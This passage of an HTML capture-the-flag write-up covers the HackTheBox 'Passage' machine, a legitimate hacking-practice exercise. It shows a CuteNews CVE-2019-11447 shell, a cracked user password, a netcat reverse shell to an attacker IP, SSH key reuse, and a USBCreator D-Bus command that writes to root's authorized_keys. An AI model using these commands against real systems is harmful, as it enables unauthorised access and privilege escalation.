            <p>Entering the website at port 80 gives us some immediate hints: the site uses <a

                <span>paul</span> since the <span>mailto</span> address points to <span>paul@passage.htb</span>.
                Comments seem to be enabled for
                anonymous users but doesn't immediately provide anything useful.

            <p>The CuteNews login page is accessible at <span>/CuteNews</span> which displays the version number, 2.1.2.
                Searching <span>cutenews 2.1.2 exploit</span> returns CVE-2019-11447, which works and drops a shell as
                <span>www-data</span>.

            <h2>3. User</h2>
            <p>Looking at the CuteNews <a
                    href="https://github.com/CuteNews/cutenews-2.0/blob/fa18b723f0e81d7be1be15caec80f192a38e3ecc/core/db/coreflat.php">source</a>,
                we see that the flat database exists in a <span>cdata</span> directory with user information in
                <span>/cdata/users/</span>. Every user seems to be split into a single file, and there is a file called
                <span>lines.php</span> which has multiple Base64-encoded rows. Let's exfiltrate and look at it:
            </p>
            <code>$ wget http://passage.htb/CuteNews/cdata/users/lines
$ cat lines | xargs -I{} bash -c 'base64 -d <<< {}' 2>/dev/null</code>
            <p><span>paul</span>'s user entry is found here, with the password hash. Cracking the hash with CrackStation
                retrieves <span>atlanta1</span>. Now we can log in to CuteNews as <span>paul-coles</span>, but it
                doesn't have anything useful in it.</p>

            <p>We might try to <span>su - paul</span> and hope for password reuse, but the restricted shell we get from
                the <a href="https://www.exploit-db.com/exploits/48800">CVE-2019-11447 POC</a> can't do that. Let's
                upgrade
                the shell with <span>nc -lvnp 4444</span> on the attacker and <span>nc 10.10.14.41 -e /bin/sh</span> in
                the restricted shell.</p>
            <code>$ nc -lvnp 4444

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
SHELL=/bin/bash script -q /dev/null

su - paul
Password: atlanta1

paul@passage:~$ id

uid=1001(paul) gid=1001(paul) groups=1001(paul)
paul@passage:~$</code>
            <figcaption>Logging in as <span>paul</span></figcaption>

            <p>We now have user access and grab the flag from <span>paul</span>'s directory.</p>

            <h2>4. Root</h2>
            <p>Since <span>paul</span> doesn't have any <span>sudo</span> permissions and the <span>nadav</span> user
                exists on the system, we might try to escalate to <span>nadav</span> first.</p>

            <p><span>paul</span> has an <span>~/.ssh/authorized_keys</span> entry, but it looks like the key belongs to
                <span>nadav@passage</span>. That means the key used to log in to <span>paul</span> user might give
                access to <span>nadav</span>.
                This is confirmed by running <span>ssh nadav@localhost</span>.
            </p>
            <code>paul@passage:~$ ssh nadav@localhost

            <figcaption>Logging in as <span>nadav</span></figcaption>
            <p>Executing <span>sudo</span> commands is still not available, but <span>nadav</span> is part of the
                <span>sudo</span> group. A <span>.viminfo</span> file in the user's home directory has traces of a
                <span>vim</span> session detailing that
                <span>/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf</span> and
                <span>/etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf</span> were edited at some point.
            </p>
            <p>An online search for <span>USBCreator exploit</span> has
                a <a
                    href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">POC
                    description</a>. If applicable, this would allow us to write arbitrary files as <span>root</span>
                wherever.</p>

            <p>Let's try copying <span>nadav</span>'s SSH key to <span>root</span>'s <span>authorized_keys</span> this
                time.
            </p>
            <code>gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/.ssh/authorized_keys /root/.ssh/authorized_keys true</code>
            <p>Now, we can log in to <span>root</span> by executing <span>ssh root@localhost</span> and get the root
                flag.</p>
